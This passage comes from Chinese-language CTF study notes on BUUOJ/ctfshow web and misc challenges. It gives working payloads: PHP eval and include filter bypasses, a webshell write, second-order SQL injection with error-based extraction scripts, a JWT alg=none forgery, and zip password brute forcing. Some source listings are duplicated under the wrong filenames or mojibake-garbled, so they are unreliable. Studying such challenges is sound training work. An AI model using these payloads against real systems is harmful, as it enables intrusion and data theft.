    if (preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)) {
        die("error v2");
    }
    eval("echo new $v1($v2());");
}
?>
```

```php
<?php
echo getcwd();
echo new FilesystemIterator(getcwd());

# 输出当前目录下的第一个文件名
```

## PHP 传参特性

**源码解析**

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include ("flag.php");
$a = $_SERVER['argv'];
$c = $_POST['fun'];
if (isset($_POST['CTF_SHOW']) && isset($_POST['CTF_SHOW.COM']) && !isset($_GET['fl0g'])) {
    if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c) && $c <= 18) {
        eval("$c" . ";");
        if ($fl0g === "flag_give_me") {
            echo $flag;
        }
    }
}
?> 
```

**此处的php特性：**在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了
such as：CTF[SHOW.COM=>CTF_SHOW.COM

```
payload：CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
```

## include 函数特性

**源码分析**

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.|\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
} else{
    highlight_file(__FILE__);
}
```

```
payload：?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

**知识点：include可以不用括号，分号可以用?>代替**

## BUUOJ [红明谷CTF 2021]write_shell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

代码读起来还是非常简单的，主要的关注点还是在`file_put_contents`这里，这个函数的作用是：文件写入；`$data`就是要写入的内容，其中要注意的是，`file_put_content()`是可以直接执行函数的

```php
file_put_contents("filename", phpinfo());
```

那么回来再看，由于`$data`已经写死是字符串了，那么就执行不了了，这里的另一个思路就是写马了，再看文件名是`index.php`，那么在访问的时候是可以执行PHP代码的，最后使用`<??>`就可以绕过正则

```
payload：action=upload&data=<?system("cat%09/flllllll1112222222lag")?>
```

## BUUOJ [CISCN2019 华北赛区 Day1 Web5]CyberPunk

> 这题，我要吐槽一下：永远鄙视把FLAG藏起来的作者！！！到底是为了考什么要把FLAG藏起来！
>
> 我都已经注入到受不了了，用脚本跑都找不到

进入查看首页源码拿到一个关键提示：

经验就可以直接知道这里能做一个文件包含，尝试了一下使用`php://filter`成功拿到源码

![image-20240215013451723](CTF.assets/image-20240215013451723.png)



**index.php**

```php
<?php
# index.php
ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>index</title>
    <base href="./">
    <meta charset="utf-8" />

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <h2>2077发售了,不来份实体典藏版吗?</h2>
        <img class="logo" src="./assets/img/logo-en.png"><!--LOGOLOGOLOGOLOGO-->
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <h3>提交订单</h3>
                <form role="form" action="./confirm.php" method="post" enctype="application/x-www-urlencoded">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>地址:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">我正是送钱之人</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <h2 class="mb">订单管理</h2>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
<!--?file=?-->
```

**search.php**

```php
<?php
# search.php

$_POST["user_name"] = 'select';
$_POST["phone"] = 'select';
if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>搜索</title>
    <base href="./">

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>订单查询</h1>
                <form method="post">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    </p>
                    <p>
                        <button class='btn btn-lg  btn-sub btn-white' type="submit">查询订单</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">订单管理</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

**change.php**

```php
<?php
# change.php
require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "è®¢åä¿®æ¹æå";
    } else {
        $msg = "æªæ¾å°è®¢å!";
    }
}else {
    $msg = "ä¿¡æ¯ä¸å¨";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ä¿®æ¹æ¶è´§å°å</title>
    <base href="./">

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>ä¿®æ¹æ¶è´§å°å</h1>
                <form method="post">
                    <p>
                    <h3>å§å:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>çµè¯:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>å°å:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <p>
                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">è®¢åç®¡ç</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
            </a>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
8$Ø<HmPfV§
```

**delete.php**

```php
<?php
# change.php
require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "è®¢åä¿®æ¹æå";
    } else {
        $msg = "æªæ¾å°è®¢å!";
    }
}else {
    $msg = "ä¿¡æ¯ä¸å¨";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ä¿®æ¹æ¶è´§å°å</title>
    <base href="./">

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>ä¿®æ¹æ¶è´§å°å</h1>
                <form method="post">
                    <p>
                    <h3>å§å:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>çµè¯:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>å°å:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <p>
                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">è®¢åç®¡ç</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
            </a>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
8$Ø<HmPfV§
```

**config.php**

```php
<?php
# change.php
require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "è®¢åä¿®æ¹æå";
    } else {
        $msg = "æªæ¾å°è®¢å!";
    }
}else {
    $msg = "ä¿¡æ¯ä¸å¨";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ä¿®æ¹æ¶è´§å°å</title>
    <base href="./">

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>ä¿®æ¹æ¶è´§å°å</h1>
                <form method="post">
                    <p>
                    <h3>å§å:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>çµè¯:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>å°å:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <p>
                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">è®¢åç®¡ç</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
            </a>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
8$Ø<HmPfV§
```

**config.php**

```php
<?php
# config.php
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

$DATABASE = array(

    "host" => "127.0.0.1",
    "username" => "root",
    "password" => "root",
    "dbname" =>"ctfusers"
);

$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
```

**confirm.php**

```php
confirm.php
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>确认订单</title>
    <base href="./">
    <meta charset="utf-8"/>

    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/custom-animations.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <img class="logo" src="./assets/img/logo-zh.png">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
                <a href="./index.php">
                    <button class='btn btn-lg  btn-sub btn-white'>返回</button>
                </a>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
        <div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">订单管理</h2>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

### 源码分析

首先先看`confirm.php`，因为这里是入口，如果这里做了过滤，那么基本就没得玩了，这里可以看到正则匹配的是过滤了`select`的，但是只对`user_name`和`phone`做了检测，并且只要SQL查询报错就会返回错误信息，那么只要后续调用了`address`的内容，就可以做到SQL二次注入

![image-20240215013950872](CTF.assets/image-20240215013950872.png)

再看`change.php`，这里刚好是调用了`$row['address']`，那么就完全可以做一个SQL二次注入，且在`address`这里是没有任何过滤出的报错注入漏洞

![image-20240215014200530](CTF.assets/image-20240215014200530.png)

首先先注入一个用户，地址写`1\`，成功触发SQL报错

![image-20240215014356064](CTF.assets/image-20240215014356064.png)

这里直接给出数据和payload

**注意：**这里`#`是直接写进数据库的，所以不用做URL编码

```
数据库：ctfusers
表名：user
字段名：user_id,address,old_address,user_name,phone

# 爆表
1' and extractvalue(0x7e, concat(0x7e, (select table_name from information_schema.tables where table_schema=database())))#

# 爆字段
1' and extractvalue(0x7e, concat(0x7e, (select substr(group_concat(column_name), 1, 30) from information_schema.columns where table_name='user' and table_schema=database())))#

数据库：ctftraining
表名：FLAG_TABLE,news,users
字段名：FLAG_COLUMN

# 爆字段
1' and extractvalue(0x7e, concat(0x7e, (select substr(group_concat(column_name), 1, 30) from information_schema.columns where table_name='FLAG_TABLE' and table_schema='ctftraining')))#
```

这里爆空了都爆不出FLAG，最后看了一下WP，说FLAG在`/flag.txt`，这里直接给出爆破脚本

**注册脚本**

```python
import requests

base_url = 'http://35853ff1-5d44-4d73-98ee-953d64822264.node5.buuoj.cn:81/confirm.php'

start = 1
end = 30

for i in range(1, 20):
    data = {
        'address': f"1' and extractvalue(0x7e, concat(0x7e, (select substr(load_file('/flag.txt'), {start}, {end}))))#",
        'phone': '123',
        'user_name': f"jkl{i}"
    }

    req = requests.post(base_url, data=data).content.decode()

    start += 30
    end += 30
    print(req)

```

**查询脚本**

```python
import requests

base_url = 'http://35853ff1-5d44-4d73-98ee-953d64822264.node5.buuoj.cn:81/change.php'

for j in range(1, 20):
    data = {
        'address': '1',
        'phone': '123',
        'user_name': f"jkl{j}"
    }

    req = requests.post(base_url, data=data).content.decode()
    print(req)

```

```
FLAG：flag{be45f1f6-fd8a-4922-a605-1086aa8236cb}
```

## BUUOJ [HFCTF2020]EasyLogin

### 1. JWT伪造

JWT就长这个样：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MiwidXNlcm5hbWUiOiJyb290MSIsInBhc3N3b3JkIjoicm9vdDEiLCJpYXQiOjE3MDgzMzA2ODJ9.1dnfM2ojsdQ66MCfKZdzN6OcyIEn9CMkqpNMhLPmVi0`

解码得：

```
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "secretid": 2,
    "username": "root1",
    "password": "root1",
    "iat": 1708330682
  }
}
```

分为三部分：`Header.Payload.Signature`

**原理：**首先，跟所有的Session一样，服务器内部自己会有一串密钥，然后当它们收到一段JWT后，首先会查看`alg`拿到对应的Hash算法，然后将第一段和第二段拼接起来，再加上服务器的密钥做哈希算法，得到的结果拿去和`Signature`做比较，一致则通过！

**漏洞：**

1. 由于JWT的内容是可以直接被解码看到的，所以可能会出现信息泄露的问题
2. 由于`alg`标出了哈希算法，那么如果在密钥过短的前提下，密钥是可以被爆破出来的
3. **如果`alg`被设置为none，那么服务器将不会再做哈希验证，从而直接通过**

### 2. 解题

打开题目,给了个登录框

 ![img](CTF.assets/f68c8bc338b54d259530464bacea537f.jpeg)

 没发现什么可以利用的，查看源代码，点击康康

![img](CTF.assets/50c878b0ca9e4077aba7c74f4ee56b35.png)

 分析可知，该题采用了koa框架，在getflag函数里发现有个/api/flag，应该是有返回flag的函数。

接着的话先附上koa项目的文件框架：

![img](CTF.assets/9bdbaa65afb64c2aadf25758ee781e4d.png)

 按照koa框架的常见结构去获取下控制器文件的源码。

`/controllers/api.js`
访问得到整个题目的源代码：

```javascript
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')
 
const APIError = require('../rest').APIError;
 
module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;
 
        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }
 
        if(global.secrets.length > 100000) {
            global.secrets = [];
        }
 
        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)
 
        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});
 
        ctx.rest({
            token: token
        });
 
        await next();
    },
 
    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;
 
        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }
 
        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
 
        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
 
        console.log(sid)
 
        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }
 
        const secret = global.secrets[sid];
 
        const user = jwt.verify(token, secret, {algorithm: 'HS256'});
 
        const status = username === user.username && password === user.password;
 
        if(status) {
            ctx.session.username = username;
        }
 
        ctx.rest({
            status
        });
 
        await next();
    },
 
    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }
 
        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });
 
        await next();
    },
 
    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```

重点看看这两个函数，一个是生成jwt的，另一个是返回flag的。

![img](CTF.assets/4830784a30874562824246240d7ca862.png)

 注意到/apu/flag路径校验为admin用户时才会返回flag，而登录验证方式采用的是JWT，所以可以尝试对JWT进行破解修改。，并且生成JWT是用HS256加密，可以把它改为none来进行破解。标题中的alg字段更改为none，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙secret值也需要为空或者undefined否则还是会触发验证，所以将JWT中secretid项修改为[]。

综上所述，一共要修改三个地方：

> 第一个是username，修改为admin
>
> ​	/api/flag 路由中要求 username 必须是admin
>
> 第二个是alog，修改为none
>
> ​	哈希算法修改为none，那么服务器将不会再做哈希验证从而直接放行
>
> 第三个是secretid，修改为[]
>
> ​	secretid被用作索引号，以从数组中获取密钥 const secret = global.secrets[sid]; ，那么给定是[]的话将拿不到密钥，相当于将密钥设置为undefined

下面是修改前后这些值的注意事项：
首先，要获取自己的jwt值，需要用burpsuite登录抓包，如下图：

![img](CTF.assets/3dac854d09f04f1bb79bbc3ebc28736e.png)

 然后复制authorization后面的内容，也就是你自己的jwt，放到JSON Web Tokens - jwt.io，查看各个值：

![img](CTF.assets/cba69592c16246149d80694fc79e5e7f.png)

 按照刚刚要修改的三个值修改，由于要修改alg为none，在网页上无法直接获取新的jwt，所以用python脚本生成，在此之前先用pip安装好生成jwt的库：PyJWT库。

脚本如下：

 值得注意的是这里的iat，是要用你自己在burpsuite里拿到的jwt里的iat值。运行得到新的jwt值。

```python
import jwt
token = jwt.encode(
{
  "secretid": [],
  "username": "admin",
  "password": "123456",
  "iat": 1662825424
},
algorithm="none",key="").encode(encoding='utf-8')
```

![image-20240219163741866](CTF.assets/image-20240219163741866.png)

 确定username为admin，且jwt为新生成的jwt后，放包，回到浏览器，访问`/api/flag`拿到flag：

## BUUOJ [HarekazeCTF2019]encode_and_encode

进来可以看到源码：

正则匹配的是：

```
.. php: file: global: ... flag
```

具体是用`file_get_contents('php://input')`控制输入流，这里用Hack Bar做POST提交没有效果，使用Python或者Burp Suite就可以，且这个输入流要绕过正则匹配，并且是一个JSON编码的数组

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
    show_source(__FILE__);
    exit();
}

function is_valid($str)
{
    $banword = [
        // no path traversal
        '\.\.',
        // no stream wrapper
        '(php|file|glob|data|tp|zip|zlib|phar):',
        // no data exfiltration
        'flag'
    ];
    $regexp = '/' . implode('|', $banword) . '/i';
    if (preg_match($regexp, $str)) {
        return false;
    }
    return true;
}

//$body = file_get_contents('php://input');           # 传入 JSON 编码后的 Array
$body = '{"page":"index.php"}';
$json = json_decode($body, true);               		# 返回 array

if (is_valid($body) && isset($json) && isset($json['page'])) {
    $page = $json['page'];
    $content = file_get_contents($page);                # 如果失败，file_get_contents() 将返回 FALSE。
    if (!$content || !is_valid($content)) {
        $content = "<p>not found</p>\n";                
    }
} else {
    $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

**知识点：**` json_decode()`在解码JSON字符的同时，还会对Unicode做解码，利用这点就可以绕过第一个`is_valid`，如下：

![image-20240222180732668](CTF.assets/image-20240222180732668.png)

那么第二个`file_get_contents($page)`的话就可以使用伪协议来对内容做base64编码以绕过第二个`is_valid`

```
payload：
{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
```

![image-20240222181001970](CTF.assets/image-20240222181001970.png)



# Misc

## János-the-Ripper-隐写-压缩包密码破解

发现一个压缩文件在里面

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
└─$ binwalk misc100 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 39, uncompressed size: 25, name: flag.txt
131           0x83            End of Zip archive, footer length: 22

```

`foremost`导出来，里面有一个加密的压缩文件

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
└─$ foremost misc100
Processing: misc100
|foundat=flag.txt
*|
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ ls
00000000.zip

```

`fcrackzip`爆破密码

```bash
# -b 爆破 -c 指定字符集为小写字母 -l 指定长度 -u 过滤错误密码
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ fcrackzip -b -c 'a' -l 4 -u 00000000.zip 


PASSWORD FOUND!!!!: pw == fish

```

解压缩得到密码

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ unzip 00000000.zip 
Archive:  00000000.zip
[00000000.zip] flag.txt password: 
  inflating: flag.txt                
                                                                                                                                                    
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ ls
00000000.zip  flag.txt
                                                                                                                                                    
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ cat flag.txt 
flag{ev3n::y0u::bru7us?!} 
```

## BUUOJ [GWCTF 2019]我有一个数据库

> 参考链接：https://blog.csdn.net/qq_45521281/article/details/105780497

### 1. 复现

